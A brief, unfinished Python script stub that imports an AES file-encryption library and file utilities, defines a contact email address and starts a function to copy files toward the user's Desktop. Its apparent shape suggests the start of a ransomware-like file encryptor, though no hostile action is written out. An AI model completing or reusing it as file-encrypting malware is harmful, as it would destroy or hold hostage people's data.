#!$HOME/anaconda3/bin/python

#==========LIBRARIES==========#
import zipfile
import pyAesCrypt
import os
import shutil

#==========VARIABLES==========#
mail="young_administration@drugsforlive.com"

#==========FUNCTIONS==========#
def copy2file():
    initial_path=os.getcwd() # define source path
    target_folder=os.path.join(os.path.expanduser("~"),"Desktop") # remeber use the loop for look that paths!
